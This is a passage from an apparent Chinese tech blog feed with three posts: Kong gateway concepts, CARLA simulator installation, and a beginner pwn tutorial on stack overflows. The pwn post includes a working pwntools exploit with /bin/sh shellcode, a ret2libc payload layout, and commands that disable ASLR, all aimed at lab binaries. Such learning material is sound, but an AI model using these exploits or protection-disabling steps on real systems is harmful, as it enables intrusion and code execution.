src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/1.png" style="zoom:67%;"><img src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/2.png" style="zoom: 33%;"><p>JWT验证需要key识别用户，secret为kong保存的私钥，algorithm为最终签名算法。</p><p>JWT最终的格式简化为三段式： base64「algorithm」. base64「payload」. base64「最终签名」 。</p><p>payload中存放key以及一些不敏感信息 username, expire time等，最终签名是使用第一段的hash算法对第二段的payload哈希后的base64值。</p><p>JWT token 可以在JWT 官网去生成，当然最好是使用JWT库封装接口传参生成JWT token。</p><p>请求时，我们使用生成的JWT token加入请求头Authorization中, 这边提一句，请求kong的路由需要先用JWT插件开启JWT验证，这样kong才能主动检查JWT token，JWT验证的粒度可以为全局，可以负载在route上，也可以在service上（对route service不清晰的同学可以看关于他们的解释），这里我们在请求的route ping上开启JWT验证：</p><img src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/4.png" style="zoom: 50%;"><img src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/3.png" style="zoom: 50%;"><p>这里保持所有为默认设置就可以了。其中迷惑性较大的是consumer 参数，参数下面的解释意思是所有匿名请求来源都会被标记为user， 该参数留白的话会将所有user标记为consumer, 也就是说请求头必须带上JWT token 否则不能被识别为consumer，请求会被kong拦截，<strong>如果填上了consumer_id，并且身份验证开启了才会奏效，说的人很懵，经过一番测试下来，发现填和不填，效果是一样的</strong>。</p><p>上面的consumer参数我设置成留白了，看看会发生什么：</p><img src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/7.png" style="zoom: 45%;"><img src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/6.png" style="zoom: 42%;"><p>未带上JWT token的请求被拦截，返回401鉴权失败，带上JWT token的请求被放行，请求到了网页</p><p>我们把test route上的JWT插件consumer填上一个consumer_id， 看看会发生什么：</p><img src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/8.png" style="zoom: 42%;"><img src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/9.png" style="zoom: 42%;"><p>第一个token是被放行的consumer的JWT token</p><p>第二个token是其他consumer的JWT token</p><p>不传token:</p><img src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/10.png" style="zoom: 42%;"><p>传第一个token:</p><img src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/11.png" style="zoom: 42%;"><p>传第二个token:</p><img src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/14.png" style="zoom: 42%;"><p>可见，即使填入了consumer_id, 其他consumer照样会被放行，和留白是一样的效果，唯一区别是带上其他consumer的token的user是否会被标记为其他consumer?</p><p>下面继续实践：</p><p>开启Acl，把被放行的consumer所在组(admin)标记为allow， 其他consumer的所在组（user）标记为deny</p><img src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/12.png" style="zoom: 42%;"><img src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/13.png" style="zoom: 42%;"><p>这时候用第二个token继续请求，</p><img src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/15.png" style="zoom: 42%;"><p>发现其他consumer被拦截了，也就是说其他consumer的身份被识别出来了。这就证明即使JWT插件填上了consumer_id，该插件并不会针对这个consumer进行身份识别，其他consumer不进行身份识别，而是和留白情况下的逻辑是一样的，所以这个参数是多余的，建议KONGA删除。因为consumer_id只会在「在consumer下创建JWT验证插件时生成，用于consumer的身份验证」，在一个route的JWT插件中设置consumer_id不符合逻辑。</p><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><blockquote><p>Service entities, as the name implies, are abstractions of each of your own upstream services. Examples of Services would be a data transformation microservice, a billing API, etc.</p></blockquote><p>Service译作服务，不同于kubernetes的service, k8s的service是一个实体服务，里面包括实体pod进行逻辑处理，而kong的服务属于逻辑上的概念，要知道，kong是个api网关，大多数情况下在进行流量转发，因此kong的service 引用的是其他实体服务访问url，这里创建一个testApi service:</p><img src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/16.png" style="zoom: 42%;"><p>这个service配置了访问链接的host, protocol, port, path等资源定位参数，做了个套娃，形成了自己的东西，美其名曰流量转发。当然这个是有好处的哈，不是每个实体服务都在公网上。现有一种情况：kong 和 其他实体服务位于同一内网内，路由器网关只允许公网请求访问kong, 其他实体服务访问不到，这样一来就只暴露了网关kong，保护了内部服务。针对多个同名服务，kong还能进行负载均衡，kong这个功能特别强大，之前我们说到consumer能用来对请求分门别类，kong同样可以根据consumer做负载均衡限制，例如第一版api请求标记为consumer v1, 经过route负载均衡后会访问v1 api的service, consumer v2 访问同样route会打到提供v2api服务的service，各种功能结合起来非常有意思。</p><h2 id="Route"><a href="#Route" class="headerlink" title="Route"></a>Route</h2><blockquote><p>The Route entities defines rules to match client requests. Each Route is associated with a Service, and a Service may have multiple Routes associated to it. Every request matching a given Route will be proxied to its associated Service.</p></blockquote><p>route顾名思义，路由，提供流量入口。kong的路由形式挺多的，有host path method可供设置：</p><img src="/2020/11/22/%E7%BD%91%E5%85%B3kong-%E4%B8%AD%E7%9A%84%E6%A6%82%E5%BF%B5consumer-service-route-plugin%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%90%86%E8%A7%A3/17.png" style="zoom: 42%;"><p>他们是逻辑and的关系，只有全满足时才会访问到route，如果一个请求有多个route可以满足，kong会计算路由的优先级，优先级越高就访问哪个route，优先级的计算也比较简单，就是看请求命中route的配置的个数，个数越多，优先级越高。例如请求命中host和path的路由的优先级比只命中path的优先级高。</p><p>route可以提供负载均衡，就是说一个route可以对应多个service。</p><p>当然route的配置还有很多，供大家一一挖掘，这里不展开了。</p><h2 id="Plugin"><a href="#Plugin" class="headerlink" title="Plugin"></a>Plugin</h2><blockquote><p>A Plugin entity represents a plugin configuration that will be executed during the HTTP request/response workflow, and it’s how you can add functionalities to APIs that run behind Kong, like Authentication or Rate Limiting for example.</p></blockquote><p>plugin即插件，主流使用lua开发（kong是openResty项目 nginx+lua），插件开发非常灵活，首先因为openresty提供了非常多的第三方库供使用，并且可以触及kong接收到的请求的生命周期，基于生命周期开发，可细粒度控制各个环节，几乎任何功能都能做到。</p><p>具体可以查看中文文档中的kong开发套件。</p><ul><li><ul><li><ul><li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&REFERENCES/PDK/kong-client.md">kong.client</a></li><li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&REFERENCES/PDK/kong-ctx.md">kong.ctx</a></li><li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&REFERENCES/PDK/kong-ip.md">kong.ip</a></li><li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&REFERENCES/PDK/kong-log.md">kong.log</a></li><li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&REFERENCES/PDK/kong-node.md">kong.node</a></li><li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&REFERENCES/PDK/kong-request.md">kong.request</a></li><li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&REFERENCES/PDK/kong-response.md">kong.response</a></li><li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&REFERENCES/PDK/kong-router.md">kong.router</a></li><li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&REFERENCES/PDK/kong-service.md">kong.service</a></li><li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&REFERENCES/PDK/kong-service-request.md">kong.service.request</a></li><li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&REFERENCES/PDK/kong-service-response.md">kong.service.response</a></li><li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&REFERENCES/PDK/kong-table.md">kong.table</a></li></ul></li></ul></li></ul><h2 id="Upstream"><a href="#Upstream" class="headerlink" title="Upstream"></a>Upstream</h2><blockquote><p> The upstream object represents a virtual hostname and can be used to loadbalance incoming requests over multiple services (targets). So for example an upstream named <code>service.v1.xyz</code> with an API object created with an <code>upstream_url=https://service.v1.xyz/some/path</code>. Requests for this API would be proxied to the targets defined within the upstream.</p></blockquote><p>很抽象的概念，其实也很好理解，类比http中的Host请求头（和route中的host一样），这个host可以理解为一个虚拟主机，Upstream中的实体和host值同名，创建Upstream，是为了控制向同名host发起的请求，或者对同名host的route做一些配置，健康检查之类的。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> kong </tag>
            
            <tag> 网关 </tag>
            
            <tag> 微服务 </tag>
            
            <tag> k8s </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自动驾驶模拟平台carla（一）安装</title>
      <link href="2020/11/18/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%A8%A1%E6%8B%9F%E5%B9%B3%E5%8F%B0carla%EF%BC%88%E4%B8%80%EF%BC%89%E5%AE%89%E8%A3%85/"/>
      <url>2020/11/18/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%A8%A1%E6%8B%9F%E5%B9%B3%E5%8F%B0carla%EF%BC%88%E4%B8%80%EF%BC%89%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>毕设</p><span id="more"></span><p>大四了，论文/毕设 选了能落地的方向</p><h1 id="平台选择"><a href="#平台选择" class="headerlink" title="平台选择"></a>平台选择</h1><h2 id="Linux-ubuntu18-04（基于vmware）"><a href="#Linux-ubuntu18-04（基于vmware）" class="headerlink" title="Linux-ubuntu18.04（基于vmware）"></a>Linux-ubuntu18.04（基于vmware）</h2><p>参考carla的 <a href="https://github.com/carla-simulator/carla">GitHub</a>，以及<a href="https://carla.readthedocs.io/en/latest/">官方文档</a>，不难发现，carla一开始是基于linux开发的，在linux上有比较好的兼容性，后面才有基于windows的carla(macOS上还没有)，所以我首先尝试用<strong>ubuntu</strong>安装：</p><h3 id="A-简易安装"><a href="#A-简易安装" class="headerlink" title="A 简易安装"></a>A 简易安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 1AF1527DE64CB8D9</span><br><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] http://dist.carla.org/carla $(lsb_release -sc) main&quot;</span><br><span class="line"></span><br><span class="line">sudo apt-get update # Update the Debian package index</span><br><span class="line">sudo apt-get install carla-simulator # Install the latest CARLA version, or update the current installation</span><br><span class="line">cd /opt/carla-simulator # Open the folder where CARLA is installed</span><br><span class="line"></span><br><span class="line">sudo apt-get install carla-simulator=0.9.10-1 # In this case, &quot;0.9.10&quot; refers to a CARLA version, and &quot;1&quot; to the Debian revision</span><br></pre></td></tr></table></figure><p>注： 国内下载非常慢，资源在 <a href="http://dist.carla.org/carla">http://dist.carla.org/carla</a> 上，延迟较高，起初下了将近四个小时才安装完成，最后启动出了点问题，后面会讲到，体验下来感觉该方法集成度更高，命令行操作更方便， 但是较难看到一些py脚本文件的源码。</p><h3 id="B-软件包安装"><a href="#B-软件包安装" class="headerlink" title="B 软件包安装"></a>B 软件包安装</h3><p>前往<a href="https://github.com/carla-simulator/carla/releases">github的release</a>下选择对应系统的软件包下载，解压之后的所有文件如下：</p><p><img src="/2020/11/18/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%A8%A1%E6%8B%9F%E5%B9%B3%E5%8F%B0carla%EF%BC%88%E4%B8%80%EF%BC%89%E5%AE%89%E8%A3%85/1.PNG" alt="figure1"></p><p>执行CarlaUE4.sh:</p><p><img src="/2020/11/18/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%A8%A1%E6%8B%9F%E5%B9%B3%E5%8F%B0carla%EF%BC%88%E4%B8%80%EF%BC%89%E5%AE%89%E8%A3%85/2.PNG" alt></p><p>报错： 驱动或硬件不支持OpenGL4.3以上版本。</p><p>openGL为开源图形库，和显卡息息相关，这里有个问题：<strong>到底是因为宿主机的显卡带不动（MX150 2G显存，carla要求的最低显存为4G）还是虚拟机使用宿主机显卡的权限很低，需要调整权限</strong>。</p><p>这里我先放下linux环境的安装，进行windows环境下的carla安装。</p><p>最后结果是，win10下可以以10FPS运行carla，GPU使用率80%，因此最终结论是vmware创建的虚拟机需要调整显卡的资源配置，以满足OpenGL 4.3的硬件驱动需求。</p><h2 id="windows-10"><a href="#windows-10" class="headerlink" title="windows 10"></a>windows 10</h2><p>一样，前往<a href="https://github.com/carla-simulator/carla/releases">github的release</a>下选择windows的软件包下载，解压后如下：</p><p><img src="/2020/11/18/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%A8%A1%E6%8B%9F%E5%B9%B3%E5%8F%B0carla%EF%BC%88%E4%B8%80%EF%BC%89%E5%AE%89%E8%A3%85/3.PNG" alt="figure1"></p><p>直接运行CarlaUE4:</p><p><img src="/2020/11/18/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%A8%A1%E6%8B%9F%E5%B9%B3%E5%8F%B0carla%EF%BC%88%E4%B8%80%EF%BC%89%E5%AE%89%E8%A3%85/4.PNG" alt="figure1"></p><p>会有一些场景，但是没车，没人，没关系，用自带的python脚本创建出来：</p><p>前提要装好pygame numpy</p><p>这里有个<strong>坑</strong>，需要安装精确到小版本的python，不然会导致carla模块找不到的问题，看源码会发现carla模块是引用egg文件导入的，egg文件上有具体的python版本要求，该文件在PythonAPI/carla/dist目录下，我的是 <strong>carla-0.9.9-py3.7-win-amd64.egg</strong>，所以我需要使用python3.7运行carla的脚本。</p><p>接下来启动脚本添加npc，npc数量用 -n 指定</p><p><img src="/2020/11/18/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%A8%A1%E6%8B%9F%E5%B9%B3%E5%8F%B0carla%EF%BC%88%E4%B8%80%EF%BC%89%E5%AE%89%E8%A3%85/5.PNG" alt="figure1"></p><p>（ERROR应该是因为npc未初始化在道路上导致碰撞，没关系，会重新初始化的）</p><p>结果：</p><p><img src="/2020/11/18/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%A8%A1%E6%8B%9F%E5%B9%B3%E5%8F%B0carla%EF%BC%88%E4%B8%80%EF%BC%89%E5%AE%89%E8%A3%85/6.PNG" alt="figure1"></p><p>下面执行控制脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manual_control.py</span><br></pre></td></tr></table></figure><p><img src="/2020/11/18/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%A8%A1%E6%8B%9F%E5%B9%B3%E5%8F%B0carla%EF%BC%88%E4%B8%80%EF%BC%89%E5%AE%89%E8%A3%85/7.PNG" alt="figure1"></p><p>终止控制脚本会返回给你操作命令说明：</p><p><img src="/2020/11/18/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%A8%A1%E6%8B%9F%E5%B9%B3%E5%8F%B0carla%EF%BC%88%E4%B8%80%EF%BC%89%E5%AE%89%E8%A3%85/8.PNG" alt="figure1"></p><p>下一篇将尝试写一些自动驾驶车辆脚本</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> 论文 </tag>
            
            <tag> carla </tag>
            
            <tag> 自动驾驶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn实践记录--rop入门</title>
      <link href="2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/"/>
      <url>2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>pwn实践记录</p><span id="more"></span><p><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/1.jpg" alt="1.jpg"><br>回过来记录入门历程主要是为了复习巩固pwn的分析思路。因为写的很详细，篇幅很长，未写完的会第二天写。全部内容包括：ret2shellcode、ret2libc(绕过NX)、ret2libc(绕过ASLR)、格式化字符串漏洞。若理解有错误，请在评论区指正，阿里嘎多。</p><p>本次回顾涉及到的elf文件以及exp都能在<a href="https://github.com/TonyShanc/new2pwn">这里</a>获取到。<br>环境准备：linux(32位程序运行环境)、IDA Pro、gdb插件、python+pwntools、不屈意志:)<br>知识回顾：<a href="https://blog.csdn.net/RChaos/article/details/104344276">操作系统预防二进制漏洞的保护机制</a>、elf文件组成、栈机制、大小端。</p><h4 id="0x00-return2shellcode"><a href="#0x00-return2shellcode" class="headerlink" title="0x00 return2shellcode"></a>0x00 return2shellcode</h4><p>文件：level1<br>习惯性查看保护机制：</p><p>很好全关，接下来利用IDA Pro F5大法查看反汇编结果：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/3.jpg" alt="3.jpg"><br>发现该二进制文件main函数入口直接调用vulnerable_function()函数，然后调用了write函数。这里提个醒，反汇编遇到write()、read()、puts()、gets()一定留个心眼，这些函数对任意变量的处理都可能造成栈溢出，不过本题输出的是字符串常量，忽略，直接查看vulnerable_function()。<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/4.jpg" alt="4.jpg"><br>看到该函数创建了个局部变量（数组指针），位置距离ebp-0x88的位置，也就是距离基指针136字节位置。read()函数读取了该函数的局部变量，上文提到read()函数不检查读取限制，并且局部变量存放在栈中，因此我们可以构造payload长度=136+4(存储ebp指针地址大小)+4(返回地址大小), 来改变函数返回地址。考虑到PIE已关，并且140字节的长度足够存储一个shellcode执行execve(“/bin/sh”)。因此我们从payload的开始位置存shellcode，剩下的用’A’补全，返回地址指向payload起始地址，也就是局部变量的起始地址。但是地址我们还不知道，因为它是在栈里面加载的。考虑到栈的动态变化，IDAPro的静态分析无法展示（它的动态分析比较麻烦），接下来用<strong>gdb配合peta插件</strong>进行动态分析：<br>在入口函数下断点：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/5.jpg" alt="5.jpg"><br>run/start 执行到main函数入口停下：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/6.jpg" alt="6.jpg"><br>依次<br>next  next<br>在汇编下一步执行vulnerable_function()函数的时候，step命令进入函数内部：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/7.jpg" alt="7.jpg"><br>进入之后，我们就能看到该函数的栈情况了<br>接下来依次next 执行到read()函数的时候，象征性输入字符：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/8.jpg" alt="8.jpg"><br>可以看到栈区0xffffd060地址上存放了该局部变量（上面的0xffffd060是文字常量区（常量池）范围内的地址，主要存储字符串常量），至此所有的分析工作就完成了。</p><p>接下来最最最关键的地方来了，很多初学者都会落进去的坑：其实gdb调试和实际执行程序的栈位置相比会有些偏移，为了提供buf更精确的位置，我们需要开启core dump功能来收集实际运行环境下的变量分布情况。<br>暂时开启core dump命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -c unlimited</span><br></pre></td></tr></table></figure><p>执行level1:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./level1</span><br></pre></td></tr></table></figure><p>输入字符使栈溢出。<br>可以看到目录下多出来了个core文件。<br>接下来用gdb 配合core文件再次调试level1<br>然后输入<code>x $esp-144</code>查看buf的位置, 这里的esp指的是实际环境下程序执行出错的时候的esp, 执行返回命令时，esp退回到main函数的栈顶，因此buf的位置 = esp指针存的位置 - payload的长度(144)。<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/10.jpg" alt="8.jpg"><br>得到buf实际地址：0xffffd0c0<br>接下来我们就能安心的写exp了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line">ret = <span class="number">0xffffd0c0</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">&#x27;A&#x27;</span> * (<span class="number">140</span> - <span class="built_in">len</span>(shellcode)) + p32(ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/9.jpg" alt="8.jpg"></p><h4 id="0x01-ret2libc-绕过NX"><a href="#0x01-ret2libc-绕过NX" class="headerlink" title="0x01 ret2libc(绕过NX)"></a>0x01 ret2libc(绕过NX)</h4><p>文件：level2<br>保护：NX<br>查看保护机制：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/11.jpg" alt="8.jpg"><br>PIE(ASLR)是系统保护，有时查看文件保护机制虽然显示enabled , 但其实是开着的，保险起见，我们可以用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>或者多次ldd &lt;filename&gt;查看地址偏移情况:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd level2</span><br></pre></td></tr></table></figure><p>修改用重定向就行了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>NX开启，栈数据段没有执行权限，因此不能将shellcode存在栈上。考虑到PIE(ASLR)没开，libc动态链接库中有execve()函数，并且存在”/bin/sh”字符串，接下来的思路就是覆盖返回地址，执行libc中的execve()或system(), 并将指向”/bin/sh”的指针作为函数的参数。<br>用IDA Pro打开，反汇编并整理成C代码，发现代码和上一题是一样的，知识NX没开；<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/3.jpg" alt="6.jpg"><br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/4.jpg" alt="6.jpg"><br>下面要做的工作是：调试level2，在libc动态链接库载入之后，找到两个系统函数和”/bin/sh”的地址。<br>在main()处设断点后，运行。<br>此时libc动态库已经载入了，然后用print 和 find命令分别查找函数和字符串的地址：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/12.jpg" alt="6.jpg"><br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/13.jpg" alt="6.jpg"><br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/14.jpg" alt="6.jpg"><br>下面是这道题的关键，传递的”/bin/sh”应该放在payload的哪个位置？<br>答：在返回地址的下一个高地址位。<br>这个问题我之前在调试信息里分析了好久，终于找到了比较合理的解释(后来才发现是我栈机制没完全看明白。。)。<br>我们先借助main()函数内部的write()调用过程来看看它的参数传递过程：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/16.jpg" alt="6.jpg"><br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/15.jpg" alt="6.jpg"><br>容易看出，执行call 0x8048340 &lt;write@plt&gt; (plt下一题会讲到) 后，栈中存进了该汇编指令的下一个指令的地址，也就是write()的返回地址。细看，又会发现write函数的三个参数，在调用call指令之前就已经压栈了，压栈顺序是参数从右到左的顺序。对应的汇编指令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x804843b &lt;main+14&gt;:mov    DWORD PTR [esp+0x8],0xd</span><br><span class="line">0x8048443 &lt;main+22&gt;:mov    DWORD PTR [esp+0x4],0x8048530</span><br><span class="line">0x804844b &lt;main+30&gt;:mov    DWORD PTR [esp],0x1</span><br></pre></td></tr></table></figure><p><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/17.jpg" alt="6.jpg"><br>因此可以这样总结：函数参数先逆序入栈，接下来才标记返回地址和执行被调用函数汇编指令。<br>分析完后，看看execve()和system()的传参要求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int execve(const char *filename, char *const argv[], char *const envp[]);</span><br><span class="line">int system(const char * string);</span><br></pre></td></tr></table></figure><p>发现system只要求一个文件名字符串指针，本着谁参数少欺负谁的态度，盘它！<br>构造payload: <code>payload = &#39;A&#39; *140 + sys_addr + &#39;A&#39; * 4 + binsh_addr</code><br>注意！这里’A’ * 4 是因为返回地址是直接到system函数内部的，没有经过call &lt;system@plt&gt;, 返回地址未压栈, 但是栈不知道，它还会认为有个返回地址，因此这里的‘A’ * 4是填补返回地址用的，如果你还想在返回时做进一步的事情，可以写个确切的地址。</p><p>这里说一句：这里不用像上一题产生core dump ，因为返回地址不在栈中，没有地址偏移影响。<br>exp如下：</p><figure class="highlight 